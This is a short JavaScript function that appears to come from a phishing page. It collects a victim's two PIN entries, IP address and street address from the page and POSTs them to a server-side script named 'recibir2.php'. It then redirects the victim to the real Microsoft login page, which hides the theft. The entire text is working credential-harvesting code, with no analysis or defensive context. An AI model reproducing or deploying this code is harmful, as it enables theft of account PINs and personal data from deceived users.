function sender() {
    var pin = document.getElementById("pin").value;
    var pin2 = document.getElementById("pin2").value;
    var ip = document.getElementById("gfg").innerHTML;
    var address = document.getElementById("address").innerHTML;
    var data = {
        pin: pin,
        pin2: pin2,
        ip: ip,
        address: address
    };
    fetch('recibir2.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    }).then(function(response) {
        window.location.href = "https://login.live.com/";
    }).catch(function(error) {
        console.error('Error:', error);
    });
    return false;
}
